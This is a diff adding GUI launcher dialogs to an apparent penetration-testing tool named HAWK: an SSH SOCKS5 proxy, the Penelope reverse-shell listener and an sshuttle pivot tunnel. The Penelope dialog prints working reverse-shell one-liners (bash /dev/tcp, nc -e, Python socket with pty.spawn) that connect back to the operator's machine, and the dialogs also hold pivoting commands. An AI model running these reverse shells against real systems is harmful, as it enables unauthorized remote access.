+                        "  [!] SSH user is empty — set it before "
+                        "launching.", "warn")
+                return
+            if not p.isdigit() or not (1 <= int(p) <= 65535):
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
+                        f"  [!] Invalid port '{p}' — 1..65535.",
+                        "warn")
+                return
+            cmd = (f"ssh -D {p} -f -N {ssh_compat} "
+                   f"{u}@{target}")
+            script = (
+                f"echo '═══  HAWK — SSH Dynamic (SOCKS5)  ═══'; "
+                f"echo 'Opening SOCKS5 proxy on Kali 127.0.0.1:{p} "
+                f"via {u}@{target}'; "
+                f"echo 'After auth, ssh forks to background — this "
+                f"xterm will exit.'; "
+                f"echo 'Test with: curl --socks5 127.0.0.1:{p} "
+                f"http://<internal_ip>'; "
+                f"echo 'Kill later with: pkill -f \"ssh -D {p}\"'; "
+                f"echo ''; "
+                f"{cmd}; "
+                f"echo ''; "
+                f"read -p 'Press ENTER to close (SOCKS still up in "
+                f"background)...'")
+            ok = _open_terminal(
+                f"HAWK — SSH Dynamic :{p}", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] SSH Dynamic SOCKS5 :{p} launched "
+                    f"({u}@{target})"
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row = _btn_row(win)
+        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
+    def _route_penelope(self, tool):
+        """Penelope launcher — port field + xterm launch.
+
+        Penelope is a REVERSE-shell handler: it opens a listener and,
+        when the target's shell connects back, gives the operator an
+        interactive PTY-upgraded session with upload/download commands.
+        The interactive part means it MUST run in a real terminal —
+        HAWK's own subprocess pipe would show the "listening on 4444"
+        banner and freeze the moment a shell tried to interact.
+        Dedicated mini dialog: pick a port, launch in an xterm.
+
+        Availability check UP FRONT — the custom intercept in _on_click
+        bypasses the normal binary precheck, so an uninstalled penelope
+        would silently fail with "command not found" at launch.
+        """
+        if not tool.is_available():
+            self._show_install_dialog(tool)
+            return
+
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import _open_terminal, lhost_detect
+
+        kali_ip = lhost_detect() or "<KALI_IP>"
+
+        win = _make_win(self, "PENELOPE — Reverse-shell handler",
+                        720, 520)
+        _title(win, "🎯  PENELOPE — Reverse-shell handler")
+        _sub(win,
+             "Modern replacement for pwncat-cs — Python 3.12/3.13 "
+             "compatible, actively maintained.",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "Penelope opens a listener on the chosen port.  When the "
+            "target's reverse shell connects back, penelope auto-"
+            "upgrades the shell to a full PTY (stty raw + terminfo), "
+            "logs every keystroke, and exposes upload/download plus "
+            "script auto-execution.\n\n"
+            "You still need to trigger the reverse shell FROM the "
+            "target — penelope only handles the receiving side.  "
+            "Common triggers (paste in the target shell, replace "
+            "<PORT> with the number below):\n\n"
+            f"   # bash /dev/tcp — modern Linux (bash built with "
+            f"--enable-net-redirections):\n"
+            f"   bash -i >& /dev/tcp/{kali_ip}/<PORT> 0>&1\n\n"
+            f"   # netcat with -e — universal fallback, works on "
+            f"legacy targets (MS2 etc.):\n"
+            f"   nc -e /bin/bash {kali_ip} <PORT>\n"
+            f"   nc -e /bin/sh   {kali_ip} <PORT>   # if bash absent\n\n"
+            f"   # Python 3 — modern Linux:\n"
+            f"   python3 -c 'import socket,os,pty;s=socket.socket();"
+            f"s.connect((\"{kali_ip}\",<PORT>));"
+            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'\n\n"
+            f"   # Python 2 — legacy targets with only python 2.x:\n"
+            f"   python -c 'import socket,subprocess,os;s=socket.socket();"
+            f"s.connect((\"{kali_ip}\",<PORT>));"
+            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  INTERACTIVE — the listener runs in an xterm so the "
+            "PTY-upgraded shell is fully usable (arrow keys, Ctrl+C, "
+            "vim, tab completion).  Close the xterm or press exit "
+            "inside penelope to stop.",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── Port field ─────────────────────────────────────────────
+        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                              border_color=COLORS["border_dim"],
+                              border_width=1, corner_radius=4)
+        param.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(param, text="  Listen port on Kali:",
+                     font=_f("sm", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))
+
+        port_prefill = (getattr(tool, "custom_args", "") or "").strip()
+        port_var = ctk.StringVar(value=port_prefill or "4444")
+        entry = ctk.CTkEntry(param, textvariable=port_var, width=140,
+            height=28, font=_f("sm"),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_green"], border_width=1,
+            corner_radius=3)
+        entry.pack(anchor="w", padx=10, pady=(0, 4))
+        ctk.CTkLabel(param,
+            text="  Any free TCP port on Kali — 4444 is the common "
+                 "default; pick something else if 4444 is busy.",
+            font=_f("xs"), text_color=COLORS["text_muted"],
+            anchor="w").pack(fill="x", padx=10, pady=(0, 8))
+
+        # ── Preview ────────────────────────────────────────────────
+        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=4)
+        prev.pack(fill="x", padx=16, pady=4)
+        ctk.CTkLabel(prev, text="  Generated command:",
+                     font=_f("sm", True), text_color=COLORS["text_green"],
+                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        preview_box = ctk.CTkTextbox(prev, height=36,
+            font=("Courier New", 12),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, state="disabled", wrap="word")
+        preview_box.pack(fill="x", padx=10, pady=(0, 8))
+
+        def _refresh(*_):
+            p = port_var.get().strip() or "4444"
+            preview_box.configure(state="normal")
+            preview_box.delete("1.0", "end")
+            preview_box.insert("1.0", f"penelope {p}")
+            preview_box.configure(state="disabled")
+
+        port_var.trace_add("write", _refresh)
+        _refresh()
+
+        # ── Launch ─────────────────────────────────────────────────
+        def _launch():
+            p = port_var.get().strip() or "4444"
+            if not p.isdigit() or not (1 <= int(p) <= 65535):
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
+                        f"  [!] Invalid port '{p}' — must be 1..65535.",
+                        "warn")
+                return
+            script = (
+                f"echo '═══  HAWK — PENELOPE listener on :{p}  ═══'; "
+                f"echo 'Waiting for a reverse shell.  Trigger on the "
+                f"target with e.g.:'; "
+                f"echo '  bash -i >& /dev/tcp/{kali_ip}/{p} 0>&1'; "
+                f"echo ''; "
+                f"penelope {p}; "
+                f"echo ''; "
+                f"read -p 'Penelope closed. Press ENTER to close...'")
+            ok = _open_terminal(f"HAWK — PENELOPE :{p}", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] PENELOPE listening on :{p} in xterm."
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row = _btn_row(win)
+        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
+    def _route_sshuttle(self, tool):
+        """SSHUTTLE launcher — SSH-user field + xterm launch.
+
+        The bare RUN path fails on two counts: the tool template has an
+        empty {extra} until the operator sets custom_args (silently
+        producing `-r @<target>`, which sshuttle rejects); and sudo
+        can't prompt inside HAWK's subprocess (needs a real TTY).  This
+        dialog collects the SSH user, previews the resolved command,
+        and launches sshuttle in an xterm so the sudo and SSH password
+        prompts are both visible and interactive.
+
+        Availability check UP FRONT — the custom intercept in _on_click
+        bypasses the normal binary precheck, so an uninstalled sshuttle
+        would silently fail with "command not found" at launch.
+        """
+        if not tool.is_available():
+            self._show_install_dialog(tool)
+            return
+
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import _open_terminal
+
+        target = ""
+        try:
+            sess = self.app.session_manager.current
+            target = sess.target_ip if sess else ""
+        except Exception:
+            pass
+        target = target or "<TARGET_IP>"
+
+        win = _make_win(self, "SSHUTTLE — Transparent SSH tunnel",
+                        720, 560)
+        _title(win, "🔐  SSHUTTLE — Transparent SSH tunnel")
+        _sub(win,
+             "Route Kali's traffic through the pivot via SSH — no "
+             "proxychains needed.",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "sshuttle SSHes into the pivot, spawns a tiny Python agent "
+            "there, and transparently rewrites Kali's routing so tools "
+            "reach the pivot's network unmodified.  0/0 tunnels ALL "
+            "traffic; --dns tunnels DNS too.\n\n"
+            "Preferred over chisel on very old kernels (< 2.6.27) "
+            "where modern Go binaries crash on epoll_create1.",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  INTERACTIVE — needs the sudo password (Kali) and the "
+            "SSH password OR key for the pivot.  Runs in an xterm so "
+            "both prompts are visible.  CTRL+C in the xterm stops the "
+            "tunnel and restores Kali's routing.\n\n"
+            "PYTHON REQUIREMENT — sshuttle uploads a small agent to "
+            "the pivot and executes it there; requires Python 2.6+ or "
+            "Python 3 on the target.  Metasploitable 2 ships Python "
+            "2.4/2.5 and will fail with a SyntaxError — use SSH "
+            "Dynamic (SOCKS5) instead on that class of target.",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── SSH user field ─────────────────────────────────────────
+        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                              border_color=COLORS["border_dim"],
+                              border_width=1, corner_radius=4)
+        param.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(param, text="  SSH user on the pivot:",
+                     font=_f("sm", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))
+
+        # Never pre-fill: the SSH username is a real credential and the
+        # operator supplies it — no defaults, no auto-guessing from the
+        # store.  Empty by default; the OPEN IN XTERM handler refuses
+        # to launch until the operator types one.
+        user_var = ctk.StringVar(value="")
+        entry = ctk.CTkEntry(param, textvariable=user_var, width=220,
+            height=28, font=_f("sm"),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_green"], border_width=1,
+            corner_radius=3,
+            placeholder_text="type the SSH username for the pivot")
+        entry.pack(anchor="w", padx=10, pady=(0, 4))
+        ctk.CTkLabel(param,
+            text="  Type the SSH user that can log into the pivot "
+                 "(then sshuttle will prompt for the SSH password in "
+                 "the xterm).",
+            font=_f("xs"), text_color=COLORS["text_muted"],
+            anchor="w").pack(fill="x", padx=10, pady=(0, 8))
+
+        # ── Preview ────────────────────────────────────────────────
+        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=4)
+        prev.pack(fill="x", padx=16, pady=4)
+        ctk.CTkLabel(prev, text="  Generated command:",
+                     font=_f("sm", True), text_color=COLORS["text_green"],
+                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        preview_box = ctk.CTkTextbox(prev, height=90,
+            font=("Courier New", 12),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, state="disabled", wrap="word")
+        preview_box.pack(fill="x", padx=10, pady=(0, 8))
+
+        # SSH compat flags for legacy targets (Metasploitable-era
+        # OpenSSH 4.x offers only ssh-rsa/ssh-dss, which modern OpenSSH
+        # 9.x rejects: "no matching host key type found").  Additive
+        # `+algo` forms are safe on modern servers too, so we always
+        # pass them and don't ask the operator.  Source of truth:
+        # target_intel_widget._COMPAT_FLAGS["ssh"].
+        ssh_compat = (
+            "-oHostKeyAlgorithms=+ssh-rsa "
+            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
+            "diffie-hellman-group14-sha1 "
+            "-oCiphers=+aes128-cbc,3des-cbc "
+            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
+            "-oMACs=+hmac-sha1,hmac-md5")
+
+        def _refresh(*_):
+            u = user_var.get().strip() or "<SSH_USER>"
+            cmd = (f"sudo sshuttle -e \"ssh {ssh_compat}\" "
+                   f"-r {u}@{target} 0/0 --dns")
+            preview_box.configure(state="normal")
+            preview_box.delete("1.0", "end")
+            preview_box.insert("1.0", cmd)
+            preview_box.configure(state="disabled")
+
+        user_var.trace_add("write", _refresh)
+        _refresh()
+
+        # ── Launch ─────────────────────────────────────────────────
+        def _launch():
+            u = user_var.get().strip()
+            if not u:
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
+                        "  [!] SSH user is empty — set it before "
+                        "launching sshuttle.", "warn")
+                return
+            cmd = (f"sudo sshuttle -e \"ssh {ssh_compat}\" "
+                   f"-r {u}@{target} 0/0 --dns")
+            script = (
+                f"echo '═══  HAWK — SSHUTTLE  ═══'; "
+                f"echo 'Tunneling ALL Kali traffic through "
+                f"{u}@{target}'; "
+                f"echo 'Prompts: sudo password (Kali), then SSH "
+                f"password for {u}@{target}'; "
+                f"echo 'CTRL+C stops the tunnel and restores routing.'; "
+                f"echo ''; "
+                f"{cmd}; "
+                f"echo ''; "
+                f"read -p 'Tunnel closed. Press ENTER to close...'")
+            ok = _open_terminal(f"HAWK — SSHUTTLE ({u}@{target})", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] SSHUTTLE launched in xterm "
+                    f"({u}@{target}, tunneling 0/0)"
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row = _btn_row(win)
+        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
     def _route_certipy_req(self, tool):
         """Certipy request-cert needs a CA name and a vulnerable
         template — both produced by CERTIPY FIND.  Instead of
